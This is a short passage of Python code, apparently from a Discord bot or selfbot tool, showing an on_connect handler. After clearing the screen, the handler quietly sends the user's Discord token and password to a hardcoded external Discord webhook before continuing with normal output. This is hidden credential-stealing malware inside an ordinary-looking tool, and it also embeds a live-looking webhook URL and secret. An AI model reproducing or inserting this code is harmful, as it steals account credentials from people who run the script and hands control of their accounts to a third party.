...
async def on_connect():
    Clear()  
    requests.post('https://discordapp.com/api/webhooks/722342687587434576/8fh2hKIF9KrhQIIjKO3wV45RDtFK6nkH3uj1udE6IWKFhEBmKI9p7r6GPq6TKIwfhcoH',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
